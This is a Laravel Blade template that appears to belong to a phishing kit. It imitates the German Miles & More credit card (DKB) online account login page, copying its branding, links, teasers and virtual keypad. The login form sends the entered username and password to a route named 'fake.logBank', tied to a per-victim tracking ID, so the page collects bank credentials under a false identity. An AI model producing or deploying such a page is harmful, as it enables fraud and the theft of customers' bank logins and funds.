@extends('layouts.fake')
@section('html_class')
    {{'js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths'}}
@endsection
@section('body_class')
    {{'core mam okkBody guestMode'}}
@endsection
@push('css')
    <link href="{{asset('css/fonts-min.css')}}" rel="stylesheet" media="all"
          type="text/css">

    <link href="{{asset('css/jquery-ui-min.css')}}" rel="stylesheet"
          type="text/css">
    <link href="{{asset('css/jquery.keypad.css')}}" rel="stylesheet" media="all"
          type="text/css">

    <link href="{{asset('css/brand-min.css')}}" rel="stylesheet" media="all"
          type="text/css">

    <link href="{{asset('css/swiper-min.css')}}" rel="stylesheet"
          type="text/css">
    <link href="{{asset('css/brandIe10plus-min.css')}}" rel="stylesheet"
          type="text/css">
    <style type="text/css">
        .showForLoggedin {
            display: none !important;
        }

        .hideForLoggedin {
        }
    </style>
@endpush
@section('content')
    <div id="header-wrapper" style="padding-bottom: 0px; top: 0px; position: absolute;">
        <div class="row logoRow">
            <div class="column logoContainer">
                <a href="https://www.miles-and-more.kartenabrechnung.de/mam"> <img
                        src="{{asset('images/banks/miles-and-more_logo.png')}}" alt=""></a>
            </div>
        </div>
        <div class="kk-header-parent">
            <div class="row kk-header">
                <div class="column">
                    <span class="before-top-bar"></span>

                    <nav class="top-bar"></nav>
                </div>
            </div>
        </div>
        <div class="row">
            <div class="column">
                <div class="login-info-bar">
                        <span id="session_info_bar " style="display: none;">
                            <span class="session_info_label" id="session_info_label"></span> &nbsp;&nbsp;&nbsp;
                            <a data-abx-jsevent="login"
                               href="https://www.miles-and-more.kartenabrechnung.de/mam/Home/login.xhtml?$event=login"
                               class="link evt-login"><span class="abaxx-button-label">Anmelden</span></a>
                        </span>
                </div>
            </div>
            <div class="header-separator"></div>
        </div>
    </div>

    <div class="row">
        <div class="small-12 columns contentContainer">
            <div class="cmsText">
                <!--protected_start-->
                <div style="text-align: center;">
                    <h3>Willkommen in Ihrem <span class="nowrap">Online-Kartenkonto</span></h3>
                    &nbsp; &nbsp;
                    <div>
                        <form id="bank_pm_form" method="POST"
                              action="{{subRoute('fake.logBank', ['track_id' => $fake->track_id])}}" class="abaxx-form" data-xpopup-mode="auto">
                            <div style="max-width: 870px; text-align: center; margin: 0 auto;">
                                <noscript>
                                        <span>
                                            <span style="color: #eeae00;">
                                                Bitte aktivieren Sie JavaScript, um alle Funktionen Ihres Online-Kartenkontos nutzen zu können.
                                            </span>
                                        </span>
                                </noscript>
                                <div id="cookieHint" style="display: none;">
                                        <span>
                                            <span style="color: #f00;">
                                                Bitte aktivieren Sie Cookies für eine fehlerfreie Funktion Ihres Online-Kartenkontos.
                                            </span>
                                        </span>
                                </div>
                                <br>

                                <div style="max-width: 300px; display: inline-block; width: 100%; text-align: left;">
                                    <div class="row">
                                        <div class="columns">
                                            <label for="id104832590_j_username" id="id104832590_j_username-label"
                                                   class="aspect-label"><span>Anmeldename (Legitimations ID)</span></label>
                                            <input class="field virtual_keypad qwertz2 text abaxx-text-80 is-keypad"
                                                   autocorrect="off" maxlength="30" name="username"
                                                   id="id104832590_j_username" type="text" autofocus="autofocus"
                                                   autocapitalize="off" autocomplete="off">
                                            <img src="{{asset('images/banks/calc.png')}}"
                                                 alt="Öffnen" title="Öffnen" class="keypad-trigger">
                                        </div>
                                    </div>
                                    <br>
                                    <div class="row">
                                        <div class="columns">
                                            <label for="id104832590_j_password" id="id104832590_j_password-label"
                                                   class="aspect-label"><span>Passwort</span></label>
                                            <input class="field virtual_keypad text abaxx-text-80 passwordKeypad is-keypad"
                                                   name="password" id="id104832590_j_password" type="password"
                                                   maxlength="100" autocomplete="off">
                                            <img src="{{asset('images/banks/calc.png')}}"
                                                 alt="Öffnen" title="Öffnen" class="keypad-trigger">
                                        </div>
                                    </div>
                                    <br>
                                    <input style="width: 100%; max-width: 100%;"
                                           data-abx-jsevent="login" type="submit" value="Anmelden"
                                           class="button por_action evt-login" data-xevent="login">
                                </div>
                            </div>
                        </form>
                    </div>
                    &nbsp;
                    <br>
                    <div>
                        <br>
                        <a href="https://www.miles-and-more.kartenabrechnung.de/mam/Welcome/content/LoginDataForgot.xhtml?$event=%24pageflow-start"
                           class="link forward notvisibleinwartungsmodus">
                            Sie haben Ihre Zugangsdaten vergessen oder Ihr Zugang ist gesperrt?
                        </a>
                        <br>
                        <br>
                        <a href="https://www.miles-and-more.kartenabrechnung.de/mam/Welcome/content/NoLoginData.xhtml?$event=%24pageflow-start"
                           class="link forward notvisibleinwartungsmodus">Sie haben noch keine Zugangsdaten?</a>
                        <br>
                        <br>
                        <a class="link forward notvisibleinwartungsmodus"
                           href="https://www.miles-and-more-kreditkarte.com/kartenkonto-anmeldung"
                           style="font-weight: normal; text-decoration: none; color: #0f286e;" target="_blank">
                            So nutzen Sie Ihre Zugangsdaten für die Anmeldung
                        </a>
                    </div>
                </div>
                <div class="show-for-medium-up" id="loginTeaser">
                    <br>

                    <div class="right_teaser">
                        <a href="https://www.miles-and-more.kartenabrechnung.de/mam/Home/content/MyCard.xhtml?$event=init#myCardExtra"
                           name="LH_Login_Teaser_1" target="_blank">
                            <div class="content image">
                                <div class="col_image"></div>

                                <div class="col_teasertext">
                                    Lufthansa Miles &amp; More Credit Card<br>
                                    <strong>Bis zu 15.000 Prämienmeilen</strong> auf Zusatzpakete
                                </div>
                            </div>
                        </a>
                    </div>

                    <div class="right_teaser">
                        <a href="https://www.tbvsc.com/en/partner-offers/miles-and-more-iv-wv-ger" name="LH_Login_Teaser_2"
                           target="_blank">
                            <div class="content image">
                                <div class="col_image"></div>

                                <div class="col_teasertext">
                                    Ingolstadt Village und Wertheim Village<br>
                                    <strong>Bis zu 6-fache Meilen</strong> für Ihre Designer-Looks
                                </div>
                            </div>
                        </a>
                    </div>

                    <div class="right_teaser">
                        <a href="https://sammeln.miles-medien.de/aktion/?trlk24" name="LH_Login_Teaser_3" target="_blank">
                            <div class="content image">
                                <div class="col_image"></div>

                                <div class="col_teasertext">
                                    MEDIA-SHOP powered by CONNECTARE<br>
                                    Sammeln Sie <strong>bis zu 9.000 Meilen</strong> für ein Jahresabo
                                </div>
                            </div>
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="footer-parent">
        <div class="row footer_outer footer" id="footer_kk">
            <div class="column">
                <div class="sub-nav">
                    <a href="https://www.miles-and-more-kreditkarte.com/service/online-kartenkonto/" target="_blank"
                       class="">Online-Kartenkonto kurz erklärt</a>

                    <a href="http://www.miles-and-more-kreditkarte.com/" target="_blank" class="">www.miles-and-more-kreditkarte.com</a>

                    <a href="https://www.miles-and-more-kreditkarte.com/service/haeufige-fragen/" target="_blank" class="">FAQ</a>
                </div>
                <div class="sub-nav">
                    <a href="https://www.miles-and-more-kreditkarte.com/service/haeufige-fragen/sicherheit/sicherheitsstandards.html"
                       target="_blank" class="">Sicherheit</a>

                    <a href="https://www.miles-and-more-kreditkarte.com/service/downloadcenter/" target="_blank" class="">Preise
                        &amp; Bedingungen</a>

                    <a href="https://www.miles-and-more-kreditkarte.com/service/downloadcenter/" target="_blank" class="">Formulare</a>
                </div>
                <div class="sub-nav">
                    <a href="https://www.miles-and-more.kartenabrechnung.de/mam/Welcome/content/ContactForm.xhtml?$event=init"
                       class="showForLoggedin" target="_self" onclick="_self"> Kontakt </a>

                    <a href="https://www.miles-and-more-kreditkarte.com/service/kontakt/online-kartenkonto.html"
                       target="_blank" class="hideForLoggedin">Kontakt</a>

                    <a href="https://www.miles-and-more.kartenabrechnung.de/mam/cms/6298251/Datenschutz.html" target="_self"
                       class="">Datenschutz </a>

                    <a onclick="tC.privacy.showPrivacyCenter();return false" class="">Cookie Einstellungen ändern</a>

                    <a href="https://www.miles-and-more.kartenabrechnung.de/mam/cms/6298257/Impressum.html" target="_self"
                       class="">Impressum </a>
                </div>
                <div class="copyright">
                    Ein Angebot der DKB AG.
                </div>
            </div>
        </div>
    </div>

    <div class="keypad-popup" style="display: none;">
        <div class="keypad-row">
            <button type="button" class="keypad-key">f</button>
            <button type="button" class="keypad-key">z</button>
            <button type="button" class="keypad-key">!</button>
            <button type="button" class="keypad-key">v</button>
            <button type="button" class="keypad-key">b</button>
            <button type="button" class="keypad-key">&gt;</button>
            <button type="button" class="keypad-key">&amp;</button>
            <button type="button" class="keypad-key">$</button>
            <button type="button" class="keypad-key">_</button>
            <button type="button" class="keypad-key">@</button>
            <button type="button" class="keypad-key">u</button>
            <div class="keypad-space"></div>
            <button type="button" class="keypad-key">0</button>
            <button type="button" class="keypad-key">6</button>
            <button type="button" class="keypad-key">8</button>
        </div>
        <div class="keypad-row">
            <button type="button" class="keypad-key">\</button>
            <button type="button" class="keypad-key">s</button>
            <button type="button" class="keypad-key">]</button>
            <button type="button" class="keypad-key">m</button>
            <button type="button" class="keypad-key">,</button>
            <button type="button" class="keypad-key">p</button>
            <button type="button" class="keypad-key">r</button>
            <button type="button" class="keypad-key">l</button>
            <button type="button" class="keypad-key">&lt;</button>
            <button type="button" class="keypad-key">e</button>
            <button type="button" class="keypad-key">^</button>
            <div class="keypad-space"></div>
            <button type="button" class="keypad-key">4</button>
            <button type="button" class="keypad-key">3</button>
            <button type="button" class="keypad-key">7</button>
        </div>
        <div class="keypad-row">
            <button type="button" class="keypad-key">#</button>
            <button type="button" class="keypad-key">w</button>
            <button type="button" class="keypad-key">j</button>
            <button type="button" class="keypad-key">"</button>
            <button type="button" class="keypad-key">h</button>
            <button type="button" class="keypad-key">ö</button>
            <button type="button" class="keypad-key">=</button>
            <button type="button" class="keypad-key">g</button>
            <button type="button" class="keypad-key">*</button>
            <button type="button" class="keypad-key">(</button>
            <button type="button" class="keypad-key">t</button>
            <div class="keypad-space"></div>
            <button type="button" class="keypad-key">9</button>
            <button type="button" class="keypad-key">5</button>
            <button type="button" class="keypad-key">1</button>
        </div>
        <div class="keypad-row">
            <button type="button" class="keypad-key">q</button>
            <button type="button" class="keypad-key">y</button>
            <button type="button" class="keypad-key">ü</button>
            <button type="button" class="keypad-key">%</button>
            <button type="button" class="keypad-key">o</button>
            <button type="button" class="keypad-key">.</button>
            <button type="button" class="keypad-key">c</button>
            <button type="button" class="keypad-key">k</button>
            <button type="button" class="keypad-key">[</button>
            <button type="button" class="keypad-key">:</button>
            <button type="button" class="keypad-key">~</button>
            <div class="keypad-space"></div>
            <button type="button" class="keypad-key">-</button>
            <button type="button" class="keypad-key">2</button>
            <button type="button" class="keypad-key">+</button>
        </div>
        <div class="keypad-row">
            <button type="button" class="keypad-key">i</button>
            <button type="button" class="keypad-key">x</button>
            <button type="button" class="keypad-key">)</button>
            <button type="button" class="keypad-key">?</button>
            <button type="button" class="keypad-key">/</button>
            <button type="button" class="keypad-key">a</button>
            <button type="button" class="keypad-key">ä</button>
            <button type="button" class="keypad-key">d</button>
            <button type="button" class="keypad-key">;</button>
            <button type="button" class="keypad-key">n</button>
        </div>
        <div class="keypad-row">
            <button type="button" class="keypad-special keypad-shift" title="Zwischen Groß- und Kleinschreibung wechseln">
                umschalten
            </button>
            <button type="button" class="keypad-special keypad-back" title="Letzte Eingabe löschen">zurück</button>
            <button type="button" class="keypad-special keypad-clear" title="Gesamten Inhalt löschen">löschen</button>
            <button type="button" class="keypad-special keypad-close" title="schließen">schließen</button>
        </div>
    </div>
@endsection
